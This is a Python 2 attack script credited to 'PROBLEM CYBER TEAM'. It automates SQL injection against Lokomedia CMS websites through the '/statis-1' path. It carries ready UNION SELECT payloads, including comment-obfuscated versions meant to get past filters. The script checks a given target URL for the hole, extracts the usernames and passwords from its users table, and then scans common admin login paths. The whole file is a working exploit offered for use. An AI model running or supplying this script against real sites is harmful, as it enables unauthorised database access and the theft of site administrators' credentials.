#!/usr/bin/python

import requests
import time
import sys
import re

banner = """
                                                                                                         
 _____ _____ __       __    _____ _____ _____ _____ _____ ____  _____ _____                              
|   __|     |  |     |  |  |     |  |  |     |     |   __|    \|     |  _  |  CODED BY : SECURITY007
|__   |  |  |  |__   |  |__|  |  |    -|  |  | | | |   __|  |  |-   -|     |  TEAM     : PROBLEM CYBER TEAM
|_____|__ _\|_____|  |_____|_____|__|__|_____|_|_|_|_____|____/|_____|__|__|  COPYRIGHT (C) 2019
         _____ _____ _____ _____    _____ _____ _____    _____ _____ _____ _____ _____ _____ _____ _____ 
        |  _  |  |  |_   _|     |  |   __|   __|_   _|  |  |  |   __|   __| __  |  _  |  _  |   __|   __|
        |     |  |  | | | |  |  |  |  |  |   __| | |    |  |  |__   |   __|    -|   __|     |__   |__   |
        |__|__|_____| |_| |_____|  |_____|_____| |_|    |_____|_____|_____|__|__|__|  |__|__|_____|_____|                                                                                                         
"""

class warna :
	HIJAU = '\033[92m'
	KUNING = '\033[33m'
	MERAH = '\033[31m'
	BIRU = '\033[94m'
	TUTUP = '\033[00m'
print warna.BIRU+banner+warna.TUTUP
def usage():
	print warna.MERAH
	print """Usage : python """+sys.argv[0]+""" <target>
	ex : python """+sys.argv[0]+""" http://lokomedia.co.id
	
	"""
	print warna.TUTUP
def cek(url):
	print warna.KUNING+"[+] Checking target..."+warna.TUTUP
	query = "/statis-1'union+select+make_set(6,@:=0x0a, (select(1)from(users)where@:=make_set(511,@,0x3C6C693E,username)),@)--+profil.html"
	lihat = requests.get(url+query).text
	if (re.search('<meta name="description" content="<li>',lihat) != None):
		print "[*] "+url+warna.HIJAU+" [ VULN ]"+warna.TUTUP
	else:
		print "[-] "+url+warna.MERAH+" [ NOT VULN ]"+warna.TUTUP
		time.sleep(0.5)
		print "[*] Finished..."
		sys.exit()
def exploiting(url):
	print warna.KUNING+"[+] Exploiting..."+warna.TUTUP
	time.sleep(1)
	user = "/statis-1'union+select+make_set(6,@:=0x0a, (select(1)from(users)where@:=make_set(511,@,0x3C6C693E,username)),@)--+profil.html"
	pwd = "/statis-1'union+select+make_set(6,@:=0x0a, (select(1)from(users)where@:=make_set(511,@,0x3C6C693E,password)),@)--+profil.html"
	bypass_user = "/statis-1'/*!50000union*/+/*!50000select*/+make_set(6,@:=0x0a, (select(1)from(users)where@:=make_set(511,@,0x3C6C693E,username)),@)--+profil.html"
	bypass_pwd = "/statis-1'/*!50000union*/+/*!50000select*/+make_set(6,@:=0x0a, (select(1)from(users)where@:=make_set(511,@,0x3C6C693E,password)),@)--+profil.html"
	req = requests.get(url+user).text
	myuser = re.findall("<meta name=\"description\" content=\"(.+?)\">",req)
	for u in myuser:
		spl = u.split('<li>')
	print "="*70
	print "[+] "+warna.HIJAU+"USERNAME:"+warna.TUTUP
	print "="*70
	for usr in spl:
		get_user = usr
		print "[*] "+warna.BIRU+get_user+warna.TUTUP
	print "="*70
	req = requests.get(url+pwd).text
	mypwd = re.findall("<meta name=\"description\" content=\"(.+?)\">",req)	
	for u in mypwd:
		spl = u.split('<li>')
	time.sleep(1)
	print "="*70
	print "[+] "+warna.HIJAU+"PASSWORD:"+warna.TUTUP
	print "="*70
	for usr in spl:
		get_pwd = usr
		print "\r[*] "+warna.BIRU+get_pwd+warna.TUTUP	
	print "="*70
def adminpage(url):
	print ""
	print "[+] "+warna.KUNING+"Scanning admin page"+warna.TUTUP
	adm =['/adm','/admin','/Admin','/Redaktur','/redaktur/index.php','/Adminlogin','/admin.php','/login','/login.php','/adminweb','/webadmin']
	for cek in adm:
		a = requests.get(url+cek).status_code
		if (a == 200):
			print "[*] "+url+cek+warna.HIJAU+" [ 200 ]"+warna.TUTUP
		else:
			print "[*] "+url+cek+warna.MERAH+" [ 404 ]"+warna.TUTUP
def main():
	if (len(sys.argv) != 2):
		usage()
		sys.exit()
	cek(sys.argv[1])
	print ''
	exploiting(sys.argv[1])
	print ''
	adminpage(sys.argv[1])
	print ''
if __name__ == "__main__":
	main()
		
	
	
	
	
	